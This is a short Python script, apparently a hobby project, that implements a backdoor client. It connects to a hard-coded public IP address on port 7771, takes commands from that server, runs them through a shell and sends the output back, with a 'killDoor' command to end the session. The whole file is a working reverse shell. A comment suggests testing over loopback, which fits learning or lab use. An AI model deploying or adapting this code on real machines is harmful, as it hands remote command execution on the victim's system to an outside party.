#Written By Stone Preheim
import socket
import subprocess

ADDR = '23.123.182.6'#my public facing IPv4. If you are looking to test this dr. use loopback.
PORT = 7771 #only open when im running server

#setting up class structure for later after socket testing
class Client:
    def __init__(self, addr, port):
        self.ADDRESS = addr
        self.PORT = port

    def connectToServer(self):
        print(f"Attempting Connection to {ADDR} port {PORT}...")
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.connect((ADDR, PORT))
            print("Connection established!")
            while True:
                try:
                    servCom = soc.recv(1024)
                    servComArr = servCom.split(b" ")
                    #custom command checking
                    if servCom == b'killDoor':
                        soc.sendall(b'EXCEPTION')#simulate an exception to close server side
                        break
                    elif servComArr[0] == b'printClient':
                        print(servComArr[1:])
                        soc.sendall(b"Text was printed!")#respond to server
                    #all other commands will be default shell commands, return output.
                    else:
                        process = subprocess.Popen(servCom.decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        output = process.stdout.read()+process.stderr.read()
                        soc.sendall(output)
                except Exception as e:
                    soc.sendall(b"EXCEPTION")
                    print(e.with_traceback())
                    break

    def sendTestPacket(ADDR, PORT):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
            soc.connect((ADDR, PORT))
            soc.sendall(b'this should come back to me')  # casting to byte like object and sending packet
            data = soc.recv(1024)

        print('Server sent:', repr(data))

if __name__ == '__main__':
    #Client.sendTestPacket(ADDR, PORT)
    client = Client(ADDR, PORT)
    client.connectToServer()
